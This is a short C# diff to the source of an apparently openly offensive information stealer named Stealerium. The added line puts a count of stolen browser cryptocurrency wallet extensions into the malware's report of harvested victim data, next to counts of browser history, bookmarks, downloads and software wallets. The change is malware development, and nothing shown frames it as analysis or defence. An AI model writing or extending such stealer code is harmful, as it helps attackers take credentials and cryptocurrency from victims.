@@ -202,6 +202,7 @@ namespace Stealerium
                        + Counter.GetIValue("⏳ History", Counter.History)
                        + Counter.GetIValue("🔖 Bookmarks", Counter.Bookmarks)
                        + Counter.GetIValue("📦 Downloads", Counter.Downloads)
+                       + Counter.GetIValue("💰 Wallet Extensions", Counter.BrowserWallets)
                        + "\n"
                        + "\n🗃 *Software:*"
                        + Counter.GetIValue("💰 Wallets", Counter.Wallets)
